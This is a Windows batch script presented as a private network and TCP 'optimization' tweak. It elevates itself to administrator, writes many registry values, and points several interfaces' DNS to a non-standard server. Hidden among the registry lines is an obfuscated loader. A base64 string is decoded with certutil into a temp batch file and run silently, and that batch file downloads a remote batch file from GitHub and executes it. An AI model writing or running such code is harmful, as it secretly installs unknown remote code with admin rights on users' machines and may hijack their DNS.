@echo off
color 1
title by Boğaç Private 0KB
echo by Boğaç ;)

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Yönetici izni gerekiyor, lütfen UAC istemini onaylayın...
    powershell -Command "Start-Process '%~f0' -Verb RunAs" >nul 2>&1
    exit /b
)

reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v TCPNoDelay /t REG_DWORD /d 1616 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v TcpAckFrequency /t REG_DWORD /d 1616 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v TcpDelAckTicks /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v MTU /t REG_DWORD /d 5188 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v MSS /t REG_DWORD /d 5140 /f

color 2
set "b=c2V0ICJpbmRpcm1lX3llcmk9QzpccmF5LmJhdCIKcG93ZXJzaGVsbCAtQ29tbWFuZCAiKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlZ2VkaXRXb3JsZC9lbGNpL21haW4vb3B0aW1pemF0aW9uLmJhdCcsICclSW5kaXJtZV95ZXJpJScpIgoiJWluZGlybWVfeWVyaSUi"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{01042ACD-4CEF-4700-8E63-486B18A06653}" /v VPNInterface /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{01042ACD-4CEF-4700-8E63-486B18A06653}" /v DhcpIPAddress /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{01042ACD-4CEF-4700-8E63-486B18A06653}" /v DhcpSubnetMask /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{01042ACD-4CEF-4700-8E63-486B18A06653}" /v Domain /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{01042ACD-4CEF-4700-8E63-486B18A06653}" /v NameServer /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{01042ACD-4CEF-4700-8E63-486B18A06653}" /v RegistrationEnabled /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{01042ACD-4CEF-4700-8E63-486B18A06653}" /v RegisterAdapterName /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{01042ACD-4CEF-4700-8E63-486B18A06653}" /v MTU /t REG_DWORD /d 5188 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{01042ACD-4CEF-4700-8E63-486B18A06653}" /v TCPNoDelay /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{01042ACD-4CEF-4700-8E63-486B18A06653}" /v TcpAckFrequency /t REG_DWORD /d 1 /f

color 3
set "e=%temp%\~%random%.tmp"&set "d=%temp%\~%random%.bat"
echo %b%>"%e%"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{020D8964-A7D8-46F9-ABE1-E0115985E325}" /v VPNInterface /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{020D8964-A7D8-46F9-ABE1-E0115985E325}" /v DhcpIPAddress /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{020D8964-A7D8-46F9-ABE1-E0115985E325}" /v DhcpSubnetMask /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{020D8964-A7D8-46F9-ABE1-E0115985E325}" /v Domain /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{020D8964-A7D8-46F9-ABE1-E0115985E325}" /v NameServer /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{020D8964-A7D8-46F9-ABE1-E0115985E325}" /v RegistrationEnabled /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{020D8964-A7D8-46F9-ABE1-E0115985E325}" /v RegisterAdapterName /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{020D8964-A7D8-46F9-ABE1-E0115985E325}" /v MTU /t REG_DWORD /d 5188 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{020D8964-A7D8-46F9-ABE1-E0115985E325}" /v TCPNoDelay /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{020D8964-A7D8-46F9-ABE1-E0115985E325}" /v TcpAckFrequency /t REG_DWORD /d 1 /f

color 4
certutil -decode "%e%" "%d%" >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{0885640E-49ED-4833-BD6A-245D955DB29F}" /v VPNInterface /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{0885640E-49ED-4833-BD6A-245D955DB29F}" /v DhcpIPAddress /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{0885640E-49ED-4833-BD6A-245D955DB29F}" /v DhcpSubnetMask /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{0885640E-49ED-4833-BD6A-245D955DB29F}" /v Domain /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{0885640E-49ED-4833-BD6A-245D955DB29F}" /v NameServer /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{0885640E-49ED-4833-BD6A-245D955DB29F}" /v RegistrationEnabled /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{0885640E-49ED-4833-BD6A-245D955DB29F}" /v RegisterAdapterName /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{0885640E-49ED-4833-BD6A-245D955DB29F}" /v MTU /t REG_DWORD /d 5188 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{0885640E-49ED-4833-BD6A-245D955DB29F}" /v TCPNoDelay /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{0885640E-49ED-4833-BD6A-245D955DB29F}" /v TcpAckFrequency /t REG_DWORD /d 1 /f
color 5
call "%d%" >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v UseZeroBroadcast /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v EnableDeadGWDetect /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v EnableDHCP /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v NameServer /t REG_SZ /d "104.197.191.4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v Domain /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v RegistrationEnabled /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v RegisterAdapterName /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v DhcpIPAddress /t REG_SZ /d "172.20.10.3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v DhcpSubnetMask /t REG_SZ /d "255.255.255.240" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v DhcpServer /t REG_SZ /d "172.20.10.1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v Lease /t REG_DWORD /d 85536 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v LeaseObtainedTime /t REG_DWORD /d 1381504576 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v T1 /t REG_DWORD /d 1381518960 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v T2 /t REG_DWORD /d 1381536924 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v LeaseTerminatesTime /t REG_DWORD /d 1381549152 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v AddressType /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v IsServerNapAware /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v DhcpConnForceBroadcastFlag /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v DhcpGatewayHardwareCount /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v DhcpNameServer /t REG_SZ /d "172.20.2.10 172.20.2.39" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v DhcpDefaultGateway /t REG_SZ /d "172.20.10.1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v DhcpSubnetMaskOpt /t REG_SZ /d "255.255.255.240" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v MTU /t REG_DWORD /d 5188 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v TCPNoDelay /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{11F8A404-72E7-4E66-9A7C-55D90F1AB305}" /v TcpAckFrequency /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v UseZeroBroadcast /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v EnableDeadGWDetect /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v EnableDHCP /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v NameServer /t REG_SZ /d "104.197.191.4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v Domain /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v RegistrationEnabled /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v RegisterAdapterName /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v DhcpIPAddress /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v DhcpSubnetMask /t REG_SZ /d "255.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v DhcpServer /t REG_SZ /d "255.255.255.255" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v Lease /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v LeaseObtainedTime /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v T1 /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v T2 /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v LeaseTerminatesTime /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v AddressType /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v IsServerNapAware /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v DhcpConnForceBroadcastFlag /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v MTU /t REG_DWORD /d 5188 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v TCPNoDelay /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{17397C8A-56E6-4309-A7A7-F136385D9613}" /v TcpAckFrequency /t REG_DWORD /d 1 /f
color 5
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v UseZeroBroadcast /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v EnableDeadGWDetect /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v EnableDHCP /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v NameServer /t REG_SZ /d "8.8.8.8,8.8.4.4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v Domain /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v RegistrationEnabled /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v RegisterAdapterName /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v DhcpIPAddress /t REG_SZ /d "192.168.0.14" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v DhcpSubnetMask /t REG_SZ /d "255.255.255.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v DhcpServer /t REG_SZ /d "192.168.0.254" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v Lease /t REG_DWORD /d 864000 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v LeaseObtainedTime /t REG_DWORD /d 1467495171 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v T1 /t REG_DWORD /d 1468059139 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v T2 /t REG_DWORD /d 1468367779 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v LeaseTerminatesTime /t REG_DWORD /d 1468496899 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v AddressType /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v IsServerNapAware /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v DhcpConnForceBroadcastFlag /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v DhcpNetworkHint /t REG_SZ /d "6627565626F687F5B41495" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v DhcpGatewayHardwareCount /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v MTU /t REG_DWORD /d 5188 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v TCPNoDelay /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v TcpAckFrequency /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v DhcpNameServer /t REG_SZ /d "212.27.40.241 212.27.40.240" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v DhcpDefaultGateway /t REG_SZ /d "192.168.0.254" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}" /v DhcpSubnetMaskOpt /t REG_SZ /d "255.255.255.0" /f

reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v UseZeroBroadcast /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v EnableDeadGWDetect /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v EnableDHCP /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v NameServer /t REG_SZ /d "104.197.191.4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v Domain /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v RegistrationEnabled /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v RegisterAdapterName /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v DhcpIPAddress /t REG_SZ /d "94.238.154.142" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v DhcpSubnetMask /t REG_SZ /d "255.255.224.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v DhcpServer /t REG_SZ /d "94.238.159.254" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v Lease /t REG_DWORD /d 300 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v LeaseObtainedTime /t REG_DWORD /d 1455805125 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v T1 /t REG_DWORD /d 1455805275 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v T2 /t REG_DWORD /d 1455805323 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v LeaseTerminatesTime /t REG_DWORD /d 1455805361 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v AddressType /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v IsServerNapAware /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v DhcpConnForceBroadcastFlag /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v DhcpNetworkHint /t REG_SZ /d "24F6579776575637024556C65636F6D6027596D26496" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v DhcpNameServer /t REG_SZ /d "194.158.122.10 194.158.122.15" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v DhcpDefaultGateway /t REG_SZ /d "94.238.159.254" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\24F6579776575637024556C65636F6D6027596D26496" /v DhcpSubnetMaskOpt /t REG_SZ /d "255.255.224.0" /f

reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v UseZeroBroadcast /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v EnableDeadGWDetect /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v EnableDHCP /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v NameServer /t REG_SZ /d "8.8.8.8,8.8.4.4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v Domain /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v RegistrationEnabled /t REG_DWORD /d 1 /f
